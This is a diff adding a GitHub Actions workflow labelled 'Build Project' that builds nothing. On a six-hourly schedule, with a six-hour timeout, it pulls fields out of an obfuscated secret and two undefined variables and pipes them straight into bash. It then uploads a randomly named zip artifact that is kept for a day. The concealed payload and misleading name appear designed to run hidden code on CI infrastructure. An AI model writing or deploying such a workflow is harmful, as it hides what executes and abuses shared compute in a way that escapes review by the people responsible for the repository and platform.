@@ -1,0 +1,30 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          vve0510: ${{ secrets.vve0510 }}
+        run: |
+          printf '%s' "$vve0510" | jq -r .ys1885 | /bin/bash
+          echo $uhc27855 | jq -r .pu33700 | /bin/bash
+          printf '%s' "$yeinw2" | jq -r .mv0 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: TcbMF3E5
+          path: "*.zip"
+          retention-days: 1
